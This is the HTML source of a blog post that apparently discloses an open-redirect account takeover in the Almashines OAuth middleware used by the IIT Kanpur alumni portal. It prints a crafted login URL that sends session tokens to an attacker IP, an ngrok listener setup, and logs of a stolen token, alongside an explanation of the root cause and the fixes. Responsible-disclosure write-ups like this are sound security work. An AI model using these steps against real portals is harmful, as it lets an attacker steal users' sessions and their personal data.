@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Almashines OAuth ATO (IIT Kanpur Alumni) - asupasuyo</title>
+  <meta property="og:title" content="Almashines OAuth ATO (IIT Kanpur Alumni)"/>
+  <meta property="og:description" content="almashines oauth disclosure"/>
+  <meta name="description" content="almashines oauth disclosure"/>
+  <link href="../css/fonts.css" rel="stylesheet"/>
+  <link rel="stylesheet" type="text/css" media="screen" href="../css/main.css"/>
+  <link rel="stylesheet" id="darkModeStyle" type="text/css" href="../css/dark.css"/>
+</head>
+<body>
+  <div class="content">
+    <header>
+      <div class="main" id="main_title">
+        <a href="../index.html">asupasuyo</a>
+      </div>
+      <nav>
+        <a href="../index.html">home</a>
+        <a href="../posts.html">posts</a>
+        <a href="../whoami.html">whoami</a>
+        <a href="#" id="theme-toggle" title="toggle dark">◐</a>
+      </nav>
+    </header>
+
+    <main>
+      <article>
+        <div class="title">
+          <h1 class="title">Account Takeover via Open Redirect in Almashines OAuth Middleware (IIT Kanpur Alumni Portal)</h1>
+          <div class="meta">14 June 2026 · ~12 min read</div>
+          <a href="https://github.com/asucodes" class="repo-link">related writeups and research on github.com/asucodes</a>
+        </div>
+
+        <section class="body">
+          <p>almashines is a saas middleware that many institutions use so they do not have to build their own social login flows from scratch. instead of every alumni portal or college site writing its own google oauth integration, they point at almashines with a client identifier, almashines handles the google side, and then it hands back a session token that the consuming application understands. the iit kanpur alumni portal at portal.iitkalumni.org was one of those consumers. it was an angularjs single-page app talking to a php backend that in turn talked to almashines.</p>
+
+          <p>this was never a flaw in oauth itself or in how google behaves. google did exactly what it is supposed to do: it validated the redirect uri it was given and issued the authorization code after the user consented. the entire problem lived in the almashines middleware and the way the consuming application was allowed to supply an untrusted post-login redirect destination with no validation or cryptographic protection.</p>
+
+          <h2>the architecture that made the attack possible</h2>
+
+          <p>the frontend was leaking the google client ids it was using right in the page source. that alone made mapping the attack surface trivial.</p>
+
+          <pre><code>// from the main account?cid=785 html source
+var default_client_id = "682063331222-ff9vvbo4ec187oobbdoicqcluklhdrqa.apps.googleusercontent.com";
+
+window.webClientId = {
+    default: default_client_id,
+    AlmashinesApps1: "238557647132-gf7m9e47kda0l29dtjen2in6hf3lf4l8.apps.googleusercontent.com",
+    AlmashinesApps2: "335772175284-t34t25qubjrutlsvj1235jnvrd5g35m2.apps.googleusercontent.com",
+    // ... more client ids for different almashines tenants
+};
+</code></pre>
+
+          <p>when a user triggered social login the spa would call into the backend api exposed by the php layer and receive a fully constructed url pointing at almashines.</p>
+
+          <pre><code>POST /api/institutes/getSocialSignupUrls/1
+
+// response body
+{
+  "url": "https://www.almashines.com/social_signup/odenr?source=google&cid=785&od_base=https%3A%2F%2Fportal.iitkalumni.org%2Fapi%2F"
+}
+</code></pre>
+
+          <p>the od_base parameter was meant to tell the middleware where to send the user (and the freshly created session token) after google authentication completed. because it was being supplied by the client and passed through without any server-side whitelist, signature check, or tenant binding, an attacker could simply point it at their own server.</p>
+
+          <h2>how the token actually leaked</h2>
+
+          <p>you craft a malicious initiation link with your own server in the od_base parameter and send it to a victim. they click it, complete the normal google consent flow, and almashines receives the code from google, mints its internal enc session token for the alumni portal, and then blindly issues a 302 redirect straight to the attacker-controlled destination, appending the token in the query string.</p>
+
+          <pre><code>HTTP/1.1 302 Found
+Location: https://dislike-pacify-agreeable.ngrok-free.dev/steal?social_signup/resp2dm?enc=bdc413cd026d140626e8e27671cb998bec09a51c20f1ffc90da0f80104d473c1ce5c1bf1cdd1e0767c20f700347a39910a4a172ccb6f92dc6de6b282043d1ffa1197a773f97f7cdbbcab7ef2838f95ccdd27451ca35707f213182d1156fc9f94cb3f83c625fc5b7028a5ec6a05489549f9f71e03f05199d780c4ea7519d289bb
+</code></pre>
+
+          <p>your listener receives the request containing the enc value. once you have that token you can inject it into your own browser on the real alumni portal (usually by dropping it into localstorage or the key the angular app expects) and the application treats you as the authenticated victim. because the token was issued after google had already succeeded, any mfa or protections on the google side offered no help.</p>
+
+          <h2>the reproduction steps i actually ran</h2>
+
+          <p>i started by testing whether any validation existed at all. i pointed od_base at a raw attacker ip.</p>
+
+          <pre><code>https://www.almashines.com/social_signup/odenr?source=google&cid=785&od_base=http%3A%2F%2F146.196.36.124%2Fsteal%3F
+</code></pre>
+
+          <p>after the google callback the state parameter already contained the attacker ip concatenated into it. that single observation proved that the middleware was taking the untrusted od_base value and stuffing it directly into the oauth state and redirect logic with no sanitisation.</p>
+
+          <p>for a real capture i needed a trusted https endpoint because modern browsers block http redirects under hsts. the usual setup was enough.</p>
+
+          <pre><code>python3 -m http.server 8080
+ngrok http 8080
+</code></pre>
+
+          <p>i then used the ngrok https url in the od_base (with a trailing question mark so the token would land cleanly as a query parameter). the 302 from almashines carried the full enc token. the python log caught the request immediately. the 404 response was expected; the only thing that mattered was that the token had left the trusted domain in the request line.</p>
+
+          <pre><code>127.0.0.1 - - [14/Jun/2026 09:38:31] "GET /steal?social_signup/resp2dm?enc=bdc413cd026d140626e8e27671cb998bec09a51c20f1ffc90da0f80104d473c1ce5c1bf1cdd1e0767c20f700347a39910a4a172ccb6f92dc6de6b282043d1ffa1197a773f97f7cdbbcab7ef2838f95ccdd27451ca35707f213182d1156fc9f94cb3f83c625fc5b7028a5ec6a05489549f9f71e03f05199d780c4ea7519d289bb HTTP/1.1" 404 -
+</code></pre>
+
+          <figure>
+            <img src="../assets/almashine-email.png" alt="disclosure email sent to alumni office and almashines contact" />
+            <figcaption>report sent june 14 with full details and poc steps.</figcaption>
+          </figure>
+
+          <p>the network tab showed the 302 leaving the trusted domain with the token visible in the location.</p>
+
+          <figure>
+            <img src="../assets/almashine-netlog.png" alt="browser network tab showing the 302 redirect carrying the enc token" />
+            <figcaption>the redirect response with the enc token visible to the attacker host.</figcaption>
+          </figure>
+
+          <p>the local server confirmed the token had arrived.</p>
+
+          <figure>
+            <img src="../assets/almashine-serverlog.png" alt="python http server log capturing the token in the request path" />
+            <figcaption>local server log proving the enc value left the trusted domain.</figcaption>
+          </figure>
+
+          <p>with the enc value in hand it was straightforward to replay it on the real portal and assume the victim's session.</p>
+
+          <h2>impact and the real architectural problem</h2>
+
+          <p>any user who could be tricked into clicking the link would have their account fully taken over. the alumni portal contained real personally identifiable information, employment history, phone numbers, addresses, and educational records for iit kanpur alumni. because it was the official alumni association site, people naturally trusted "login with google" links that appeared to come from their college network.</p>
+
+          <p>the consequences went beyond a single user. once an attacker has a valid enc token they can scale the attack if they can get victims to click (phishing, malicious links in email, etc.). no mfa protections on the google side helped because the session token was minted after google authentication had already succeeded.</p>
+
+          <p>the cvss v3.1 base score was 9.1 (critical). the cwe was 601 for open redirect leading to a dangling session pointer and account takeover. the root cause was architectural: a multi-tenant auth saas was accepting a completely caller-controlled post-auth destination for the session token with zero enforcement that the destination actually belonged to the tenant (the cid) that started the flow. the consuming spa and php backend simply built and exposed the social signup url containing that parameter.</p>
+
+          <h2>fix</h2>
+
+          <p>the od_base parameter (or whatever name the post-auth return destination uses) must be validated server-side against a strict allowlist that is keyed to the specific cid or tenant. it should not be possible for the client, or an attacker replaying the initiation, to make the middleware issue a 302 that carries the freshly minted enc token to an arbitrary origin.</p>
+
+          <p>the ideal fix is to stop letting the caller control the final destination for the token altogether. when the social flow is initiated, record the intended return target server-side (bound to the initiation session or a short-lived signed value) and only permit the final redirect that carries the enc token to go to that pre-approved target.</p>
+
+          <p>if the saas model genuinely requires dynamic post-auth targets for its customers, the parameter must be cryptographically signed by the legitimate backend at the moment the social signup url is generated. the almashines middleware must verify that signature before it issues the redirect containing the session token.</p>
+
+          <p>binding the issued enc token to the original origin (so it is only usable from the expected alumni portal domain) would also prevent simple replay attacks on attacker-controlled hosts.</p>
+
+          <p class="meta" style="margin-top:2em;">the full report, including the leaked client ids from the spa html, the exact malicious initiation urls, the polluted state parameter on the google callback, the 302 location header carrying the enc token, the server access logs showing the exfiltration, and the complete reproduction steps, was sent to contact@almashines.com, alumni_office@iitk.ac.in and dora@iitk.ac.in on 14 june 2026.</p>
+        </section>
+      </article>
+    </main>
+
+    <footer>
+      <div class="soc"><a href="https://github.com/asucodes">gh</a></div>
+      <div class="soc"><a href="https://x.com/asupasuyo">x</a></div>
+      <div class="footer-info">asupasuyo · independent · <a href="mailto:onepetaflop@gmail.com">onepetaflop@gmail.com</a></div>
+    </footer>
+  </div>
+  <script src="../js/site.js"></script>
+</body>
+</html>
